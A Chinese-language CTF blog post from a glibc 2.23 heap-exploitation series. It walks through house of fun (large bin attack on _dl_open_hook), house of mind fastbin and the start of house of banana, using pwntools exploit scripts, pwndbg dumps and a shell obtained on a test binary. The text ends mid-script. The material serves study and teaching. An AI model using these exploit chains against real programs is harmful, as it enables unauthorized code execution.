---
layout: post
title: 【pwn4heap】pwn4heap - glibc2.23其六
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# pwn4heap - glibc2.23其六

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-24 house of fun

本方法在技术原理上归属于 **Large Bin Attack** 的范畴。该技术的核心在于利用 **Glibc 堆管理器**中 **Large Bin 链表**在插入或重组 **chunk** 时的逻辑缺陷。具体而言，当将一个特定大小的 **chunk** 从 **Unsorted Bin** 整理至 **Large Bin** 时，分配器会执行 ``bk_nextsize`` 和 ``bk`` 指针的更新操作（对应源码中的 `victim->bk_nextsize->fd_nextsize = victim` 与 `bck->fd = victim`）。由于缺乏对这两个指针完整性的充分验证，通过提前篡改目标 **chunk** 的 ``bk_nextsize`` 指针，可以诱使分配器将一个可控的地址值（通常是一个较大的 size 字段）写入任意目标内存地址，从而实现一次 **任意地址写** 原语。

本利用链的创新之处在于，将此次 **任意地址写** 的目标设定为 `_dl_open_hook` 全局符号。`_dl_open_hook` 是一个在动态链接器内部使用的函数指针钩子，控制该指针可以劫持库文件加载等关键流程的执行流。通过 **Large Bin Attack**，成功将 `_dl_open_hook` 的值修改为一个指向精心构造的、包含 **one_gadget** 地址的内存布局。

**one_gadget** 是 libc 中存在的、一段以 `execve("/bin/sh", ..., ...)` 或类似形式调用 shell 的短指令序列，其执行通常需要满足特定的寄存器约束。通过堆布局，在 `_dl_open_hook` 被调用时，确保这些约束条件得到满足。

因此，当后续程序执行触发动链接器相关操作（例如加载新库、或某些错误处理路径）时，便会调用被篡改的 `_dl_open_hook`。其实际效果是直接跳转至预设的 **one_gadget** 地址执行。由于 **one_gadget** 本身位于 libc 的合法代码段，此举不仅成功获取了 shell 的控制权，而且完全避免了在栈或堆上部署 shellcode 的需求，有效绕过了 **NX**（不可执行内存）等常见防护机制，体现了在仅有写原语条件下实现稳定代码执行的高级利用思路。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/13/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_fun/exploit.py)。

核心利用代码如下：

```python
# house of fun
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
conn.sendafter(b"Enter introduction: ", b"A" * 0x8)
magic = use_magic()
malloc(0, 0x18, b"A" * 0x8)
malloc(1, 0x720 - 0x8, b"B" * 0x8)
malloc(2, 0x18, b"C" * 0x8)
malloc(3, 0x710 - 0x8, b"D" * 0x8)
malloc(4, 0x18, b"E" * 0x8)
delete(3)
author_name, introduction, content = show(3)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"_dl_open_hook: {hex(libc.sym['_dl_open_hook'])}")
# Due to the complexities associated with satisfying one-gadget constraints in specific libc environments,
# I opt for the magic function as a more reliable alternative.
#
# one_gadget = libc.address + 0xCF70A
one_gadget = magic
log.info(f"one_gadget addr: {hex(one_gadget)}")
malloc(5, 0x800 - 0x8, b"F" * 0x8)
payload = p64(0) + p64(libc.sym["_dl_open_hook"] - 0x10)
edit(3, len(payload), payload)
delete(1)
malloc(6, 0x800 - 0x8, b"G" * 0x8)
payload = b"A" * 0x10 + p64(one_gadget)
edit(0, len(payload), payload)
delete(3)
conn.recvline()
cmd = b"cat src/2.23/house_of_fun/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在**漏洞利用链**的初始阶段，连续发起五次**内存分配请求**，依次申请 `chunks[0]`、`chunks[1]`、`chunks[2]`、`chunks[3]` 和 `chunks[4]`。此布局具有明确的技术目的：

1.  **构造大小关系**：精心设置 `chunks[1]` 和 `chunks[3]` 的尺寸，确保 `chunks[1]->size > chunks[3]->size`。
2.  **确保归属 Large Bin**：两者的大小均被设定在 **Large Bin** 的范围内（在 **glibc 2.23** 中，通常指大于 `0x400` 字节的 **chunk**）。这是后续利用 **Large Bin Attack** 技术的先决条件，因为依赖于 **Large Bin** 在维护**有序链表**（按 size **降序排列**）时的特定逻辑。
3.  **插入保护性 Chunk**：在 `chunks[1]` 和 `chunks[3]` 之后分别申请的 `chunks[2]` 和 `chunks[4]`（尺寸较小，如 `0x18`），其作用是作为“**栅栏**”（fence）或“**保护器**”（guard）。它们的主要目的是防止 `chunks[1]` 和 `chunks[3]` 在后续被释放时，与 **top chunk** 发生**合并**，从而确保它们能够独立进入预期的 **bin**（**unsorted bin** 或 **large bin**）中，为**泄露地址**和**篡改指针**创造稳定的**内存状态**。

因此，该操作序列旨在主动塑造堆的布局，制造出两个存在特定大小关系、且均属于 **Large Bin** 范围的潜在**受害者chunk**（**victim chunk**），为触发 **Large Bin 管理代码**中的**漏洞**并实现**任意地址写**奠定基础。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x55efba511000
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x55efba511020
Size: 0x720 (with flag bits: 0x721)

Allocated chunk | PREV_INUSE
Addr: 0x55efba511740
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x55efba511760
Size: 0x710 (with flag bits: 0x711)

Allocated chunk | PREV_INUSE
Addr: 0x55efba511e70
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x55efba511e90
Size: 0x20170 (with flag bits: 0x20171)

pwndbg> 
```

随后，**释放**先前申请的 `chunks[3]`（通过调用 **`free` 函数**）。由于该 **chunk** 的尺寸较大（大于 **fastbin** 范围），它不会被放入 **fastbin**，而是被插入到 **unsorted bin** 中。

在 **glibc** 的**堆管理机制**中，当一个 **chunk** 被放入 **unsorted bin** 时，其 **`fd`**（前向指针）和 **`bk`**（后向指针）会被更新，指向 **`main_arena`**（主分配区）内部的一个管理结构地址（通常是 `main_arena.top` 附近的地址）。**`main_arena`** 是 **libc** 数据段中的一个全局结构体，因此其地址与 **libc 库的基址**之间存在固定的偏移。

因此，通过释放 `chunks[3]` 使其进入 **unsorted bin**，进而在该 **chunk** 的 **`fd`** 和 **`bk`** 位置“植入”了一个指向 **libc** 内部的指针。随后，可以利用程序提供的“**读**”功能（例如 **`show` 函数**）再次读取 `chunks[3]` 的**用户数据区**。由于堆管理器在释放时并未清空旧数据，之前写入的用户数据与 **chunk** 的**元数据**（包括 **`fd`** 和 **`bk`**）可能共存于同一内存区域。通过精心构造读取操作，可以泄露出 **`bk`**（或 **`fd`**）指针的值。

计算 `libc_base = leaked_bk_address - main_arena_offset`，即可得到 **libc** 在内存中的实际**基址**。成功泄露 **libc 基址**是后续整个利用链的关键前提，它为计算目标函数（如 **`system`**、**`__free_hook`**、**`_IO_list_all`**）以及 **`one_gadget`** 的运行时地址提供了必不可少的基准。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x55efba511760 —▸ 0x70cd0eb8db78 (main_arena+88) ◂— 0x55efba511760
pwndbg> 
```

接着，通过 **`malloc`** 申请一块新的内存，记为 **`chunks[5]`**。关键之处在于，其请求的**大小**（`size`）必须大于仍处于 **unsorted bin** 中的 **`chunks[3]`** 的尺寸。

此操作是驱动 **Large Bin Attack** 利用链前进的核心步骤。其技术原理在于 **glibc 堆管理器** **`_int_malloc`** 的函数逻辑：当有一个大小合适的 **chunk** 存在于 **unsorted bin** 中，但无法满足当前较小的分配请求时，分配器会遍历 **unsorted bin**，将其中的 **chunk** 根据大小重新分类并插入到对应的 **small bins** 或 **large bins** 中。

由于 **`chunks[3]`** 的尺寸属于 **large bin** 范围，且 **`chunks[5]`** 的申请尺寸更大，分配器在遍历处理 **unsorted bin** 时，会将 **`chunks[3]`** 从 **unsorted bin** 链表中摘下，并依据其尺寸将其插入到对应的 **large bins** 链表中。在此过程中，**large bins** 为了保持其内部 **chunk** 按尺寸**降序排列**的有序性，会执行一系列链表指针的调整操作（涉及 **`fd_nextsize`** 和 **`bk_nextsize`** 指针）。正是要利用后续对这些指针的恶意篡改，来触发 **large bin attack** 的**任意地址写**漏洞。

因此，申请 **`chunks[5]`** 的目的并非为了获取该 **chunk** 本身，而是主动触发一次堆管理器的 **bin 整理操作**，将 **`chunks[3]`** 从过渡区的 **unsorted bin** 正式移入目标位置——有序的 **large bins** 结构内，从而为后续篡改其链表指针、实现任意地址写入创造必要的先决条件。

```bash
pwndbg> largebins 
largebins
0x700-0x730: 0x55efba511760 —▸ 0x70cd0eb8e028 (main_arena+1288) ◂— 0x55efba511760
pwndbg> 
pwndbg> x/12gx chunks
0x55efa64a20c0 <chunks>:        0x0000000000000018      0x000055efba511010
0x55efa64a20d0 <chunks+16>:     0x0000000000000718      0x000055efba511030
0x55efa64a20e0 <chunks+32>:     0x0000000000000018      0x000055efba511750
0x55efa64a20f0 <chunks+48>:     0x0000000000000708      0x000055efba511770
0x55efa64a2100 <chunks+64>:     0x0000000000000018      0x000055efba511e80
0x55efa64a2110 <chunks+80>:     0x00000000000007f8      0x000055efba511ea0
pwndbg> 
```

在**大型堆块**（**Large Bin Attack**）的利用中，通过**篡改**已释放**大型堆块**（**victim chunk**）的 **`bk`**（后向指针）和 **`bk_nextsize`**（大小链后向指针），可以分别触发两个独立的**任意地址写入**（**Write-What-Where**）原语。

1.  **修改 bk 指针**：当将 **`bk`** 设置为 `libc.sym["_dl_open_hook"] - 0x10` 时，在 **large bin** 排序逻辑的后续步骤中，执行 **`bck->fd = victim`** 这一行代码。此时，`bck` 指向 `_dl_open_hook - 0x10`，因此该操作会将 **`victim`** 堆块的地址写入 **`bck->fd`**，即 `(_dl_open_hook - 0x10) + 0x10 = _dl_open_hook` 这个内存地址。成功用可控的堆地址覆盖了 **`_dl_open_hook`** 指针。

2.  **修改 bk_nextsize 指针**：同理，若将 **`bk_nextsize`** 修改为 `libc.sym["_dl_open_hook"] - 0x20`，则会触发 **`victim->bk_nextsize->fd_nextsize = victim`** 这一漏洞点。此时，`victim->bk_nextsize` 指向 `_dl_open_hook - 0x20`，该操作会将 **`victim`** 地址写入 `(victim->bk_nextsize)->fd_nextsize`，即 `(_dl_open_hook - 0x20) + 0x20 = _dl_open_hook` 地址。同样实现了对 **`_dl_open_hook`** 的覆盖。

**结论**：两种修改方式均能达成将 **`_dl_open_hook`** 全局指针覆盖为可控的堆地址（即 **`victim`** 的地址）这一最终目标。它们利用了同一段排序代码中两个不同的、但性质相似的**指针解引用与赋值缺陷**。利用路径的差异仅在于触发写入的代码行和所需预设的指针偏移（`-0x10` 或 `-0x20`），这提供了适应不同内存布局或约束条件的灵活性。在利用中，选择其中一种方式即可。

```bash
pwndbg> largebins 
largebins
0x700-0x730 [corrupted]
FD: 0x55efba511760 ◂— 0
BK: 0x55efba511760 —▸ 0x70cd0eb92330 (buffer+16) ◂— 0x2779b1e06af86f90
pwndbg> x/6gx 0x55efba511760
0x55efba511760: 0x0000000000000000      0x0000000000000711
0x55efba511770: 0x0000000000000000      0x000070cd0eb92330
0x55efba511780: 0x000055efba511760      0x000055efba511760
pwndbg> x/1gx &_dl_open_hook
0x70cd0eb92340 <_dl_open_hook>: 0x0000000000000000
pwndbg> 
```

在完成对 **`chunks[3]`** 的**元数据**（**`bk`** 和 **`bk_nextsize`** 指针）的恶意篡改后，利用链进入实际的**触发阶段**。此阶段包含两个紧密衔接、具有因果关系的操作：

1.  **释放 chunks[1] 至 Unsorted Bin**：首先调用 **`free(chunks[1])`**。由于 **`chunks[1]`** 的尺寸属于 **large bin** 范围，它被插入到 **unsorted bin** 的链表中。此时，该 **chunk** 的 **`fd`** 和 **`bk`** 指针被堆管理器初始化为指向 **`main_arena`** 的相关地址。

2.  **申请 chunks[6] 触发 Large Bin Attack**：紧接着发起一次特定的内存分配请求，例如 **`malloc(chunks[6])`**。此次申请的尺寸（`nb`）是关键，它不仅必须大于 **`chunks[1]`** 的尺寸，而且必须大于 **`chunks[3]`** 的尺寸。这个尺寸选择确保了分配器在 **`_int_malloc`** 函数中遍历 **unsorted bin** 时，不会直接使用 **`chunks[1]`** 来满足此次请求（因为它太大），但会因为无法找到精确匹配，而启动将 **unsorted bin** 中 **chunk** 整理（排序）到对应 **smallbin** 或 **largebin** 的流程。
     当处理到 **`chunks[1]`** 时，由于其尺寸属于 **large bin** 范围，且对应的 **large bin** 中已存在其他 **chunk**（例如之前移入的 **`chunks[3]`**），分配器会执行**大型堆块排序插入**逻辑。正是在这段代码中，它会**使用被篡改的 `bk` 和 `bk_nextsize` 指针**。具体来说：
    *   根据被篡改的 **`bk`** 指针执行 **`bck->fd = victim`**，将 **`chunks[1]`** 的地址写入 **`_dl_open_hook`**。
    *   或根据被篡改的 **`bk_nextsize`** 指针执行 **`victim->bk_nextsize->fd_nextsize = victim`**，同样将 **`chunks[1]`** 的地址写入 **`_dl_open_hook`**。

因此，“**释放**”是为准备恶意状态的内存块；“**申请**”则是驱动堆分配器执行预设的、有缺陷的代码路径，将内存破坏转化为一次稳定的**任意地址写入**（将可控的堆地址写入 **`_dl_open_hook`**），从而完成 **Large Bin Attack** 的核心利用。

```bash
pwndbg> x/1gx &_dl_open_hook
0x70cd0eb92340 <_dl_open_hook>: 0x000055efba511020
pwndbg> 
```

在成功通过 **Large Bin Attack** 将全局指针 **`_dl_open_hook`** 的值篡改为可控堆块 **`chunks[1]`** 的地址后，利用流程进入关键的**内存布局控制**阶段。

此时，**`_dl_open_hook`** 不再指向 **libc** 数据段中的合法结构，而是指向可控的堆内存区域（即 **`chunks[1]`** 的**用户数据区**）。在 **glibc** 中，**`_dl_open_hook`** 是一个指向 **`struct dl_open_hook`** 结构的指针，该结构包含一系列在动态链接器加载共享库时调用的函数指针（例如 **`dl_open`**、**`dl_close`** 等钩子）。控制此结构意味着可以**劫持**库加载的关键流程。

随后通过**编辑** **`chunks[0]`** 来间接修改 **`_dl_open_hook`** 所指向的“结构体”字段。这种操作之所以可行，是因为 **`chunks[0]`** 与 **`chunks[1]`** 在内存中**物理相邻**。通过**堆溢出**等漏洞，编辑 **`chunks[0]`** 的用户数据可以**覆盖**到 **`chunks[1]`** 的起始部分。

```bash
pwndbg> p/x *(struct dl_open_hook*)0x55efba511020
$1 = {
  dlopen_mode = 0x55efa649f8d5,
  dlsym = 0x721,
  dlclose = 0x55efba511760
}
pwndbg> x/6i 0x55efa649f8d5
   0x55efa649f8d5 <magic>:      endbr64
   0x55efa649f8d9 <magic+4>:    push   rbp
   0x55efa649f8da <magic+5>:    mov    rbp,rsp
   0x55efa649f8dd <magic+8>:    lea    rax,[rip+0x86f]        # 0x55efa64a0153
   0x55efa649f8e4 <magic+15>:   mov    rdi,rax
   0x55efa649f8e7 <magic+18>:   call   0x55efa649f180 <system@plt>
pwndbg> 
```

在成功将 **`_dl_open_hook`** 结构体中的 **`dlopen_mode`** 函数指针篡改为 **`one_gadget`** 的地址后，利用链进入最终的**触发执行**阶段。通过调用 **`free(chunks[3])`** 来主动释放该堆块。

此释放操作并非为了回收内存，而是旨在故意触发 **`_int_free`** 函数内部的**错误处理路径**。**`_int_free`** 是 **glibc** 中实现 **`free`** 功能的核心函数，其中包含对堆块**元数据**（如 **`size`** 字段、前后块状态）的严格校验。当校验失败时，程序执行流会跳转至 **`_int_free`** 函数内的错误处理标签（例如 **`errout`**）。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3988
   3982         goto errout;
   3983       }
   3984     /* Or whether the block is actually not marked used.  */
   3985     if (__glibc_unlikely (!prev_inuse(nextchunk)))
   3986       {
   3987         errstr = "double free or corruption (!prev)";
 ► 3988         goto errout;
```

当程序执行流因堆块释放错误而进入 **`_int_free`** 函数的 **`errout`** 标签后，从 **`errout`** 开始步进，程序会调用 **`malloc_printerr`** 函数。此函数是 **glibc** 中专门用于处理堆分配器（**malloc**）相关错误（如**double free**、**内存损坏**等）的**核心例程**。其作用是准备错误信息并决定后续处理方式。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3868
   3862       || __builtin_expect (misaligned_chunk (p), 0))
   3863     {
   3864       errstr = "free(): invalid pointer";
   3865     errout:
   3866       if (!have_lock && locked)
   3867         (void) mutex_unlock (&av->mutex);
 ► 3868       malloc_printerr (check_action, errstr, chunk2mem (p), av);
   3869       return;
```

接着，在 **`malloc_printerr`** 函数内部继续步进，程序逻辑会进一步调用 **`__libc_message`** 函数。这是一个更底层的、用于输出**致命错误消息**并可能**终止进程**的库函数。**`__libc_message`** 内部可能涉及向**标准错误流**（**stderr**）输出信息、生成**核心转储**（**core dump**）等操作。

```c
/* Abort with an error message.  */
void
__libc_message (int do_abort, const char *fmt, ...)
{
...
  if (do_abort)
    {
      BEFORE_ABORT (do_abort, written, fd);

      /* Kill the application.  */
      abort ();
    }
}

#define BEFORE_ABORT		backtrace_and_maps

static void
backtrace_and_maps (int do_abort, bool written, int fd)
{
  if (do_abort > 1 && written)
    {
      void *addrs[64];
#define naddrs (sizeof (addrs) / sizeof (addrs[0]))
      int n = __backtrace (addrs, naddrs);
      if (n > 2)
        {
#define strnsize(str) str, strlen (str)
#define writestr(str) write_not_cancel (fd, str)
          writestr (strnsize ("======= Backtrace: =========\n"));
          __backtrace_symbols_fd (addrs + 1, n - 1, fd);

          writestr (strnsize ("======= Memory map: ========\n"));
          int fd2 = open_not_cancel_2 ("/proc/self/maps", O_RDONLY);
          char buf[1024];
          ssize_t n2;
          while ((n2 = read_not_cancel (fd2, buf, sizeof (buf))) > 0)
            if (write_not_cancel (fd, buf, n2) != n2)
              break;
          close_not_cancel_no_status (fd2);
        }
    }
}
```

在步进执行至 **`__libc_message`** 函数后，程序执行流会进一步调用 **`__backtrace`** 函数。**`__backtrace`** 是 **glibc** 提供的库函数，其核心功能是获取当前线程的**函数调用堆栈**（**stack trace**）信息。在错误处理场景中，它被用于收集从程序启动到发生错误（此处为堆管理器检测到的严重错误）之间的一系列函数调用地址，旨在为开发者或后续的**核心转储**（**core dump**）提供详细的**调试上下文**，以定位问题根源。

```c
int
__backtrace (void **array, int size)
{
  struct trace_arg arg = { .array = array, .cfa = 0, .size = size, .cnt = -1 };

  if (size <= 0)
    return 0;

#ifdef SHARED
  __libc_once_define (static, once);

  __libc_once (once, init);
  if (unwind_backtrace == NULL)
    return 0;
#endif

  unwind_backtrace (backtrace_helper, &arg);

  /* _Unwind_Backtrace seems to put NULL address above
     _start.  Fix it up here.  */
  if (arg.cnt > 1 && arg.array[arg.cnt - 1] == NULL)
    --arg.cnt;
  return arg.cnt != -1 ? arg.cnt : 0;
}
weak_alias (__backtrace, backtrace)
libc_hidden_def (__backtrace)
```

在动态跟踪至 **`__backtrace`** 函数后，程序执行流继续深入，进入了 **`__libc_once`** 函数。**`__libc_once`** 是 **glibc** 内部用于实现**一次性初始化**的**底层机制**。其核心作用是确保某个特定的**初始化函数**（通常被命名为 **`init`** 或类似的函数指针）在整个**进程生命周期**内仅被精确地执行一次，即使多个线程可能并发尝试触发此初始化。这是通过**原子操作**和**锁机制**来实现的**线程安全初始化**。

```c
static void
init (void)
{
  libgcc_handle = __libc_dlopen ("libgcc_s.so.1");

  if (libgcc_handle == NULL)
    return;

  unwind_backtrace = __libc_dlsym (libgcc_handle, "_Unwind_Backtrace");
  unwind_getip = __libc_dlsym (libgcc_handle, "_Unwind_GetIP");
  if (unwind_getip == NULL)
    unwind_backtrace = NULL;
  unwind_getcfa = (__libc_dlsym (libgcc_handle, "_Unwind_GetCFA")
		  ?: dummy_getcfa);
}

#define __libc_dlopen(name) \
  __libc_dlopen_mode (name, RTLD_LAZY | __RTLD_DLOPEN)
```

在控制流进入 **`__libc_dlopen_mode`** 函数时，标志着整个利用链已抵达最终触发阶段的**核心**。此函数是 **glibc** 内部用于**动态加载**共享库的**关键例程**，其执行通常由**错误处理流程**（如 **`malloc_printerr`** 报告严重堆错误后）或**线程相关异常**（如栈保护故障）所间接引发。

```c
void *
__libc_dlopen_mode (const char *name, int mode)
{
  struct do_dlopen_args args;
  args.name = name;
  args.mode = mode;
  args.caller_dlopen = RETURN_ADDRESS (0);

#ifdef SHARED
  if (__glibc_unlikely (_dl_open_hook != NULL))
    return _dl_open_hook->dlopen_mode (name, mode);
  return (dlerror_run (do_dlopen, &args) ? NULL : (void *) args.map);
#else
  if (dlerror_run (do_dlopen, &args))
    return NULL;

  __libc_register_dl_open_hook (args.map);
  __libc_register_dlfcn_hook (args.map);
  return (void *) args.map;
#endif
}
libc_hidden_def (__libc_dlopen_mode)
```

在利用链的最后阶段，当动态调试器步进至 **`__libc_dlopen_mode`** 函数内部时，可以清晰地观察到全局指针 **`_dl_open_hook`** 的值已不为空（**NULL**）。此刻，该指针不再指向 **libc** 数据段中的默认结构，而是已被 **Large Bin Attack** 成功覆盖为可控的**堆地址**（即 **`chunks[1]`** 的起始地址）。

程序随后执行关键调用：**`_dl_open_hook->dlopen_mode (name, mode)`**。由于 **`_dl_open_hook`** 指向伪造的 **`struct dl_open_hook`** 结构，其中的 **`dlopen_mode`** 成员已在前期通过编辑 **`chunks[0]`** 被精确地修改为 **`one_gadget`** 的地址。因此，这次原本用于加载动态库的合法函数调用，其控制流被彻底**劫持**，直接跳转至 **`one_gadget`** 的指令序列。


### 1-25 house of mind fastbin

本方法是一种针对 glibc 堆管理器中 fastbin 机制的漏洞利用技术。其核心思想是通过操纵或伪造一个 非主分配区（non-main arena） 的结构，诱使堆管理器将释放的块（chunk）链入一个可控的 fastbin 链表，最终实现任意地址写或代码执行。

该技术之所以被认为**条件十分苛刻**，主要基于以下几点：
1.  **对内存布局的精密要求**：需要能够精确布局堆内存，至少控制一个 chunk 并将其释放至 fastbin。同时，必须有能力篡改关键元数据（如 `arena` 指针）或全局变量（如 `global_max_fast`），以改变堆管理器对`arena`的认知。
2.  **对 `non-main arena` 的依赖**：该技术通常依赖于程序使用多线程（每个线程有独立的 arena）或能够伪造一个完整的 `malloc_state` 结构（模拟一个 arena）。这需要了解 `malloc_state` 的内部布局，并确保伪造结构中的关键字段（如 fastbins 数组）指向受控地址。
3.  **利用步骤的复杂性**：整个利用链涉及多个阶段的堆操作与状态转换，包括但不限于：触发 fastbin 分配与释放、篡改 arena 指针、伪造 arena 结构、以及最终通过分配操作将控制流导向目标地址。任何一个步骤的堆布局不符合预期都可能导致利用失败。

由于其成功依赖于多重复杂条件的精确满足，且在多线程或动态内存使用模式下堆状态易受干扰，该技术的**稳定性通常较低**，在实际漏洞利用中并非首选方案。因此，鉴于其应用门槛高、可靠性有限，此处不再对其利用过程进行逐步剖析。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/15/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_mind_fastbin/exploit.py)。

核心利用代码如下：

```python
HEAP_MAX_SIZE = 0x4000000
MAX_SIZE = (128 * 1024) - 0x100

# house of mind fastbin
conn.sendafter(b"Enter author name: ", b"\x00" * 0x8)
fake_arena = b"\x00" * (0x880 - 0x28) + b"\xff\xff\xff" + b"\x00"
conn.sendafter(b"Enter introduction: ", fake_arena)
magic = use_magic()
log.info(f"magic addr: {hex(magic)}")
malloc(0, 0xF8, b"A" * 0x8)
malloc(1, 0xF8, b"B" * 0x8)
malloc(2, 0xF8, b"C" * 0x8)
malloc(3, 0xF8, b"D" * 0x8)
delete(0)
delete(2)
author_name, introduction, content = show(0)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"_dl_open_hook: {hex(libc.sym['_dl_open_hook'])}")
one_gadget = magic
log.info(f"one_gadget addr: {hex(one_gadget)}")
payload = b"A" * 0x8 + b"A"
edit(0, len(payload), payload)
author_name, introduction, content = show(0)
chunk2_addr = u64(content[8 : 8 + 6].ljust(8, b"\x00")) - ord("A")
chunk3_addr = chunk2_addr + 0x100
log.info(f"chunk2 addr: {hex(chunk2_addr)}")
log.info(f"chunk3 addr: {hex(chunk3_addr)}")
payload = p64(main_arena88) + p64(chunk2_addr)
edit(0, len(payload), payload)
malloc(0, 0xF8, b"A" * 0x8)
malloc(2, 0xF8, b"C" * 0x8)


new_arena_value = (chunk3_addr + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1)
fake_heap_info = new_arena_value
log.info(f"new_arena_value addr: {hex(new_arena_value)}")
log.info(f"fake_heap_info addr: {hex(fake_heap_info)}")
malloc(4, MAX_SIZE, b"\x00" * 0x8)
chunk4_addr = chunk3_addr + 0x100
quotient = int((new_arena_value - chunk4_addr) / (MAX_SIZE + 0x10))
remainder = int((new_arena_value - chunk4_addr) % (MAX_SIZE + 0x10))
log.info(f"quotient : {hex(quotient)}")
log.info(f"remainder : {hex(remainder)}")
for _ in range(quotient):
    malloc(4, MAX_SIZE, b"E" * 0x8)

chunk4_addr = chunk4_addr + (quotient * (MAX_SIZE + 0x10))
log.info(f"chunk4 addr: {hex(chunk4_addr)}")
malloc(5, MAX_SIZE, b"F" * 0x8)
chunk5_addr = chunk4_addr + (MAX_SIZE + 0x10)
log.info(f"chunk5 addr: {hex(chunk5_addr)}")

malloc(6, 0x40, b"G" * 0x8)
chunk6_addr = chunk5_addr + (MAX_SIZE + 0x10)
log.info(f"chunk6 addr: {hex(chunk6_addr)}")
malloc(7, 0x40, b"H" * 0x8)
chunk7_addr = chunk6_addr + 0x40 + 0x10
log.info(f"chunk7 addr: {hex(chunk7_addr)}")

payload = b"E" * (remainder - 0x10) + p64(magic - 0x20)
edit(4, len(payload), payload)
payload = b"G" * 0x40 + p64(0) + p64(0x50 | 0x4)
edit(6, len(payload), payload)
delete(7)
conn.sendlineafter(b"> ", str(0x4D41474943).encode())
conn.sendline(str(chunk7_addr).encode())
conn.interactive()
cmd = b"cat src/2.23/house_of_mind_fastbin/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

成功利用结果如下：

```bash
[*] magic addr: 0x572a4bbe4080
[*] main_arena+88: 0x779f3e58db78
[*] _dl_open_hook: 0x779f3e592340
[*] one_gadget addr: 0x572a4bbe4080
[*] one_gadget addr: 0x572a4bbe4080
[*] chunk2 addr: 0x572a84718200
[*] chunk3 addr: 0x572a84718300
[*] new_arena_value addr: 0x572a88000000
[*] fake_heap_info addr: 0x572a88000000
[*] quotient : 0x1c8
[*] remainder : 0x2780
[*] chunk4 addr: 0x572a87ffd880
[*] chunk5 addr: 0x572a8801d790
[*] chunk6 addr: 0x572a8803d6a0
[*] chunk7 addr: 0x572a8803d6f0
[*] Switching to interactive mode
$ id
uid=1000(bogon) gid=1000(bogon) groups=1000(bogon)
$
```

### 1-26 house of banana

本方法是一种针对**动态链接运行时环境**的高级漏洞利用技术。其核心利用面并非应用程序本身，而是其底层依赖的动态链接器（`ld.so`）。首先需通过其他漏洞（如堆溢出、任意地址写等）获得**任意写原语**，进而**篡改动态链接器内部的全局管理结构`_rtld_global`**。

该结构包含管理所有已加载库的`link_map`链表。利用的核心在于**精心构造一个或多个恶意的`link_map`结构体**，并将其通过篡改的指针插入到动态链接器维护的库链表中。在伪造的`link_map`中，可以控制多个关键字段：
- **`l_addr`**：库的加载基址偏移，可用于计算符号地址。
- **`l_name`**：库的名称指针，可指向可控字符串。
- **`l_info[]`数组**：指向ELF动态节（`.dynamic`）中各项条目（如`DT_STRTAB`、`DT_SYMTAB`、`DT_JMPREL`）的指针。控制这些指针意味着可以伪造字符串表、符号表和重定位表。

当程序后续执行需要动态链接器介入的操作时（例如调用外部库函数、进行延迟绑定`PLT`解析、或加载新库），动态链接器会遍历`link_map`链表并依据这些结构中的指针进行解析。通过恶意`link_map`，可以实现：
1.  **劫持符号解析结果**：将函数名解析重定向至任意地址（如`system`或`one_gadget`）。
2.  **控制重定位过程**：在`DT_JMPREL`相关的重定位条目中写入目标地址，实现`GOT`覆写。
3.  **触发任意代码执行**：某些内部函数（如`_dl_fixup`、`_dl_lookup_symbol_x`）在解析过程中会调用依赖于这些表的函数指针。

由于利用发生在动态链接器这一“信任根基”层面，该技术能够**绕过包括完整`RELRO`（只读重定位）在内的常见防护机制**，因为防护代码本身依赖于被利用的链接器数据结构。其利用条件苛刻，但成功后具有极强的稳定性和隐蔽性，是高级利用中用于突破安全沙箱或实现持久化的重要手段。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/16/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_banana/exploit.py)。

核心利用代码如下：

```python
# house of banana
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
magic = use_magic()
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
_rtld_global = libc.address + 0x622040
link_map0 = _rtld_global
link_map1 = _rtld_global + 0x16C0
# Due to the complexities associated with satisfying one-gadget constraints in specific libc environments,
# I opt for the magic function as a more reliable alternative.
#
